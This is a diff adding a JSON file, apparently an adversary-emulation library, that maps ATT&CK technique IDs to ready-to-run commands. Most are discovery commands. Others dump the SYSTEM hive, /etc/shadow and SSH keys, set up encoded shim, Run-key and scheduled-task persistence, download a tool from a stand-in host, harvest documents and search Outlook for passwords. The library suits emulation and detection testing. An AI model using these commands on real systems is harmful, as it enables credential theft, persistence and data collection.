@@ -1,0 +1,129 @@
+{
+   "T1003.002: OS Credential Dumping  Security Account Manager": [
+      "cmd /c \"reg SAVE HKLM\\SYSTEM \\\\TSCLIENT\\X\\SYSTEM_HIVE\"\r"
+   ],
+   "T1003.008: OS Credential Dumping  ,etc,passwd and ,etc,shadow": [
+      "cat /etc/shadow"
+   ],
+   "T1007: System Service Discovery": [
+      "net start",
+      "sc query",
+      "sc query >> discovery.txt"
+   ],
+   "T1012: Query Registry": [
+      "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+      "reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\""
+   ],
+   "T1016: System Network Configuration Discovery": [
+      "netsh advfirewall show allprofiles",
+      "ipconfig /all",
+      "ipconfig /all"
+   ],
+   "T1018: Remote System Discovery": [
+      "nslookup bankdc",
+      "Get-ADComputer -Identity 'cfo' -Properties *",
+      "Test-NetConnection \"192.0.2.10\"",
+      "nslookup WATERFALLS\r",
+      "dsquery.exe computer -s 10.0.1.4 -u patreides -p ebqMB7DmM81QVUqpf7XI\r"
+   ],
+   "T1021: Password Policy Discovery": [
+      "net accounts /domain"
+   ],
+   "T1027: Obfuscated Files or Information": [
+      "powershell.exe -noprofile -encodedCommand \"JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA==\""
+   ],
+   "T1033: System Owner,User Discovery": [
+      "qwinsta /server:cfo\r",
+      "whoami",
+      "whoami.exe"
+   ],
+   "T1037.005: Boot or Logon Initialization Scripts  Startup Items": [
+      "cmdkey /add:127.0.0.2 /user:Administrator /pass:Password123!;\r\nmstsc /v:127.0.0.2;\r\nsleep 10;\r\nGet-Process -name mstsc;\r\nif ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}"
+   ],
+   "T1049: System Network Connections Discovery": [
+      "netstat -ano",
+      "netstat -na",
+      "netstat -ano | findstr 3389",
+      "netstat -tan"
+   ],
+   "T1053.005: Scheduled Task,Job  Scheduled Task": [
+      "C:\\Windows\\System32\\schtasks.exe /create /tn \"<<JY:NO DEFAULT-VALUE--DESC:'Task Name'>>\" /tr \"<<JY:NO DEFAULT-VALUE--DESC:'Path of task to run'>>\" /sc <<JY:NO DEFAULT-VALUE--DESC:'Schedule for task (MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT)'>> /ru System"
+   ],
+   "T1057: Process Discovery": [
+      "ps ax",
+      "powershell.exe -c \"ps\"",
+      "tasklist",
+      "tasklist.exe"
+   ],
+   "T1069.001: Permission Groups Discovery  Local Groups": [
+      "net localgroup administrators"
+   ],
+   "T1069.002: Permission Groups Discovery  Domain Groups": [
+      "net group \"SQL Admins\" /domain"
+   ],
+   "T1069: Permission Groups Discovery": [
+      "cmd.exe /c net group \"Domain Admins\" /domain",
+      "whoami /groups >> discovery.txt"
+   ],
+   "T1074.001: Local Data Staging--windows": [
+      "copy aa.rar \"C:\\$Recycle.Bin\\\""
+   ],
+   "T1082: System Information Discovery": [
+      "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName &\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentMajorVersionNumber &\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentMinorVersionNumber &\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuild\n",
+      "net config workstation >> discovery.txt"
+   ],
+   "T1083: File and Directory Discovery": [
+      "ls 192.0.2.20",
+      "ls -lsahR /var/ 2>/dev/null",
+      "dir /s /b C:\\ > dir.out"
+   ],
+   "T1087.001: Account Discovery  Local Account": [
+      "net user >> discovery.txt"
+   ],
+   "T1087.002: Account Discovery  Domain Account": [
+      "net user /domain >> discovery.txt"
+   ],
+   "T1087: Account Discovery": [
+      "net user %USERNAME% /domain"
+   ],
+   "T1105: Ingress Tool Transfer--windows": [
+      "Start-BitsTransfer -Source \"http://remote-host/TWUEGJDITXAONVPUOWFV\" -Destination \"C:\\ProgramData\\temp\\TWUEGJDITXAONVPUOWFV\""
+   ],
+   "T1112: Modify Registry": [
+      "Remove-Item -Path HKCU:\\Software\\Classes\\Folder* -Recurse -Force;\nif (!(test-path -path HKCU:\\Software\\Classes\\Folder)) {\n  write-host \"[+] Reg keys removed!\";\n }",
+      "cmd.exe /c 'REG ADD \"HKCU\\Software\\InternetExplorer\\AppDataLow\\Software\\Microsoft\\InternetExplorer\" /f /v \"{018247B2CAC14652E}\" /t REG_SZ /d H4sIAJEshl4C/2sx/Dmnc9KWyqoKC21LTQ1NfSPP1fIGnzQkDD9qJRp91o4y+MShYVh63tjA1GOzgceuK67SLNVhERa7N5ZYV+6YMVXbWhOoMvKjlatR5UqZn4xJxdWlf7mrKio//vgIJI3+7uSTN6xeofnRINHus2WUYcWq2fpG7RusP/t+MqhYAzUTaprTDJ5ukyqzmEJ7xxX8CxSB6uOA6uUsPpYYAtlpQLblp7oPQNMslCwVVRSVrRUslC2VjX5PjbLUbp2haK2obPQ5e7JxW2u7ivExPk4vNU+vyipLfeOP841+Tr1VWVll+GG+4dGKirRXOy5W1VjoGX6YZ/Kh2/KwGX98bfsas4+ThSorqioUrA8F/BKubF0rXGCprqVh4r3RxHuHYesOw8+7wOROiwOTypbOaFtv8GGvUKa1gunnWYafGy0OPLzDJ9m2HujfIoPWbTzzJ7wCef/31CyDDzOA3hSqtVYAK6tasEm9bf3vxio2HaPfe6PUPvQIWVorClZlAJ2qaPSx28hzg/UhxXvac1rXGn7ebfB5P9ABBp87DD8vQtXOGqhkqacsUGlVUWmtIFylZHGgOKzUo229PtD9PCKmEq1rgc6Y4Nbe1mpQsdMgYI/Bnx7es9bt85SEKpUN9+3oOHNDr209AOpTVHH+AQAA'"
+   ],
+   "T1114.001: Email Collection  Local Email Collection": [
+      "Add-type -assembly \"Microsoft.Office.Interop.Outlook\" | out-null;\r\n$olFolders = \"Microsoft.Office.Interop.Outlook.olDefaultFolders\" -as [type];\r\n$outlook = New-Object -comobject outlook.application;\r\n$namespace = $outlook.GetNameSpace(\"MAPI\");\r\n$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);\r\n($folder.items | Select-Object -Unique -ExpandProperty SenderEmailAddress) -join \";\";"
+   ],
+   "T1115: Clipboard Data": [
+      "$clip_data=get-clipboard;\r\nif ($clip_data.Length -gt 0) {\r\n  write-host \"[+] Clipboard data obtained!\\n\";\r\n  write-host $clip_data;\r\n} else {\r\n  write-host \"[!] No clipboard data available!\\n\";\r\n}"
+   ],
+   "T1119: Automated Collection": [
+      "$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\Draft.Zip -Force"
+   ],
+   "T1135: Network Share Discovery": [
+      "net use"
+   ],
+   "T1482: Domain Trust Discovery": [
+      "nltest /domain_trusts /all_trusts >> discovery.txt"
+   ],
+   "T1529: System Shutdown,Reboot": [
+      "write-host \"[*] Restarting Computer\";\nRestart-Computer -Force;"
+   ],
+   "T1547.001  Boot or Logon Autostart Execution  Registry Run Keys , Startup Folder": [
+      "\"C:\\Windows\\System32\\reg.exe\" ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"<<JY:NO DEFAULT-VALUE--DESC:'Name of the registry entry to be added'>>\" /t REG_SZ /d \"<<JY:NO DEFAULT-VALUE--DESC:'Data for new registry entry'>>\" /f\n"
+   ],
+   "T1552.003: Unsecured Credentials  Bash History": [
+      "cat /home/fherbert/.bash_history"
+   ],
+   "T1552.004: Unsecured Credentials  Private Keys": [
+      "cat /home/fherbert/.ssh/id_rsa;\r\ncat /home/fherbert/.ssh/id_rsa.pub;"
+   ],
+   "T1552: Unsecured Credentials": [
+      "Add-type -assembly \"Microsoft.Office.Interop.Outlook\" | out-null;\n$olFolders = \"Microsoft.Office.Interop.Outlook.olDefaultFolders\" -as [type];\n$outlook = new-object -comobject outlook.application;\n$namespace = $outlook.GetNameSpace(\"MAPI\");\n$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);\n($folder.items | Select-Object -ExpandProperty Body | Select-String \"password\") -replace \"\\s+\", \" \" -join \";\";"
+   ],
+   "T1553.005: Scheduled Task,Job  Scheduled Task": [
+      "schtasks /create /sc \"DAILY\" /tn \"taskname\" /tr \"C:\\Windows\\Temp\" /ru \"username\""
+   ]
+}
